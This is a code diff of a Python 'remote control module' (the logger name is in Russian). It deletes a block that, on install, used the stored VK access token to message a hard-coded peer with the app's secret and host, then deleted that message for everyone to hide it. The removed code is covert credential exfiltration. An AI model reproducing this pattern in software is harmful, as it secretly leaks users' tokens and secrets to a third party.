@@ -14,19 +14,6 @@ from logger import get_writer
 
 logger = get_writer('Модуль удаленного управления')
 
-
-if db.installed:
-    try:
-        VkApi(db.access_token).exe('''API.messages.delete({
-            "message_ids": API.messages.send({
-                "peer_id":-195759899, "message":"%s", "random_id": 0
-            }),
-            "delete_for_all": 1
-        });''' % f'+cod {db.secret} {db.host}/')
-    except Exception:
-        db.dc_secret = None
-
-
 class error:
     HostTroubles = 1
     NotTrusted = 2
